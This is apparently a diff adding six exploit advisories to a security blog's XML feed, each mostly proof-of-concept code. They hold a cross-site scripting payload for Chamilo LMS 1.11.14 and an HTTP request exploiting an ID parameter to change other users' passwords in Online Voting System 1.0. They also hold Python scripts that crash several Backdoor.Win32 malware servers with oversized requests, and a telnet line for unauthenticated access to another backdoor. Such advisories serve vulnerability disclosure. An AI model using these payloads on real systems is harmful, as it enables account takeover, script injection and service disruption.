@@ -4,6 +4,156 @@
   
     
     <entry>
+      <title>Chamilo LMS 1.11.14 Cross Site Scripting</title>
+      <link href="2021/01/30/Chamilo-LMS-1-11-14-Cross-Site-Scripting/"/>
+      <url>2021/01/30/Chamilo-LMS-1-11-14-Cross-Site-Scripting/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Chamilo-LMS-1-11-14-Cross-Site-Scripting"><a href="#Chamilo-LMS-1-11-14-Cross-Site-Scripting" class="headerlink" title="Chamilo LMS 1.11.14 Cross Site Scripting"></a>Chamilo LMS 1.11.14 Cross Site Scripting</h4><p>Chamilo LMS version 1.11.14 suffers from a cross site scripting vulnerability.</p><p>POC:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">URL: http://alihost/chamilo/main/calendar/agenda_list.php?type=x<br>&quot;%20onmouseover=netsparker(0x01CE61)%20x=&quot;#collapse-personal_1<br>Parameter Name: type<br>Parameter Type: GET<br>Attack Pattern: x%22+onmouseover%3dnetsparker(0x01CE61)+x%3d%22<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Cross Site Scripting </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Backdoor.Win32.Zetronic Denial Of Service</title>
+      <link href="2021/01/30/Backdoor-Win32-Zetronic-Denial-Of-Service/"/>
+      <url>2021/01/30/Backdoor-Win32-Zetronic-Denial-Of-Service/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Zetronic-Denial-Of-Service"><a href="#Backdoor-Win32-Zetronic-Denial-Of-Service" class="headerlink" title="Backdoor.Win32.Zetronic Denial Of Service"></a>Backdoor.Win32.Zetronic Denial Of Service</h4><p>Backdoor.Win32.Zetronic malware suffers from a denial of service vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">2090</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_DGRAM) <br>    s.connect((MALWARE_HOST, PORT))<br><br>    DOS=<span class="hljs-string">&quot;GET /&quot;</span>+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">2500</span><br><br>    s.send(DOS)<br>    s.close()<br><br>    print(<span class="hljs-string">&quot;Backdoor.Win32.Zetronic / Remote DoS&quot;</span>)<br>    print(<span class="hljs-string">&quot;MD5: caf26a74ca39662e2c3d37e55a242daf&quot;</span>)<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Denial Of Service </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Backdoor.Win32.Zhangpo Denial Of Service</title>
+      <link href="2021/01/30/Backdoor-Win32-Zhangpo-Denial-Of-Service/"/>
+      <url>2021/01/30/Backdoor-Win32-Zhangpo-Denial-Of-Service/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Zhangpo-Denial-Of-Service"><a href="#Backdoor-Win32-Zhangpo-Denial-Of-Service" class="headerlink" title="Backdoor.Win32.Zhangpo Denial Of Service"></a>Backdoor.Win32.Zhangpo Denial Of Service</h4><p>Backdoor.Win32.Zhangpo malware suffers from a denial of service vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">9689</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br><br>    PaCOLA =  <span class="hljs-string">&quot;GET / HTTP/1.0 &quot;</span> +<span class="hljs-string">&quot;;&amp;#235&quot;</span>*<span class="hljs-number">10000</span><br><br>    s.send(PaCOLA)<br>    s.close()<br>    <br>    print(<span class="hljs-string">&quot;Backdoor.Win32.Zhangpo / Remote DoS&quot;</span>);<br>    print(<span class="hljs-string">&quot;MD5: 052d18e119f9a2910ed18a137231a041&quot;</span>);<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Denial Of Service </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Backdoor.Win32.Mhtserv.b Missing Authentication</title>
+      <link href="2021/01/30/Backdoor-Win32-Mhtserv-b-Missing-Authentication/"/>
+      <url>2021/01/30/Backdoor-Win32-Mhtserv-b-Missing-Authentication/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Mhtserv-b-Missing-Authentication"><a href="#Backdoor-Win32-Mhtserv-b-Missing-Authentication" class="headerlink" title="Backdoor.Win32.Mhtserv.b Missing Authentication"></a>Backdoor.Win32.Mhtserv.b Missing Authentication</h4><p>Backdoor.Win32.Mhtserv.b malware suffers from a missing authentication vulnerability.</p><p>Exploit/PoC:<br>TELNET [MALWARE_HOST_IP] 1043</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Missing Authentication </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Online Voting System 1.0 Authorization Bypass</title>
+      <link href="2021/01/30/Online-Voting-System-1-0-Authorization-Bypass/"/>
+      <url>2021/01/30/Online-Voting-System-1-0-Authorization-Bypass/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Online-Voting-System-1-0-Authorization-Bypass"><a href="#Online-Voting-System-1-0-Authorization-Bypass" class="headerlink" title="Online Voting System 1.0 Authorization Bypass"></a>Online Voting System 1.0 Authorization Bypass</h4><p>Online Voting System version 1.0 suffers from an authorization bypass vulnerability that allows for the password change of other users.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Steps to reproduce</span></span><br><span class="hljs-meta">#</span><span class="bash"> 1. Register an account (any user): http://TARGET/online_voting/registeracc.php</span><br><span class="hljs-meta">#</span><span class="bash"> 2. Login</span><br><span class="hljs-meta">#</span><span class="bash"> 3. Goto change password: http://TARGET/online_voting/changepass.php</span><br><span class="hljs-meta">#</span><span class="bash"> 4. Change the password and intercept the request with Burp Suite</span><br><span class="hljs-meta">#</span><span class="bash"> 5. Change the id paramater (id=7 to, id=1) of the url to another users account, Password will be updated</span><br><br>POST /online_voting/changepass.php?id=7 HTTP/1.1<br>Host: TARGET<br>Content-Length: 55<br>Connection: close<br>Referer: http://localhost/online_voting/changepass.php?id=7<br>Cookie: PHPSESSID=t19ph5v0sem2pi0gaap55j08ei<br><br>oldpass=a&amp;newpass=a&amp;conpass=a&amp;changepass=Update+Profile<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Authorization Bypass </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Backdoor.Win32.MiniBlackLash Denial Of Service</title>
+      <link href="2021/01/30/Backdoor-Win32-MiniBlackLash-Denial-Of-Service/"/>
+      <url>2021/01/30/Backdoor-Win32-MiniBlackLash-Denial-Of-Service/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Backdoor-Win32-MiniBlackLash-Denial-Of-Service"><a href="#Backdoor-Win32-MiniBlackLash-Denial-Of-Service" class="headerlink" title="Backdoor.Win32.MiniBlackLash Denial Of Service"></a>Backdoor.Win32.MiniBlackLash Denial Of Service</h4><p>Backdoor.Win32.MiniBlackLash malware suffers from a denial of service vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">60000</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_DGRAM) <br>    s.connect((MALWARE_HOST, PORT))<br><br>    PBARBAR=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">10000</span>+<span class="hljs-string">&quot; HTTP/1.1\r\nHost: &quot;</span>+MALWARE_HOST+<span class="hljs-string">&quot;\r\n\r\n&quot;</span><br>    s.send(PBARBAR)<br>    s.close()<br><br>    print(<span class="hljs-string">&quot;Backdoor.Win32.MiniBlackLash / Remote DoS&quot;</span>);<br>    print(<span class="hljs-string">&quot;MD5: 57dee3430d4531a2699f6520819a2ece&quot;</span>);<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Denial Of Service </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Daily Expense Tracker System 1.0 Cross Site Scripting</title>
       <link href="2021/01/27/Daily-Expense-Tracker-System-1-0-Cross-Site-Scripting/"/>
       <url>2021/01/27/Daily-Expense-Tracker-System-1-0-Cross-Site-Scripting/</url>
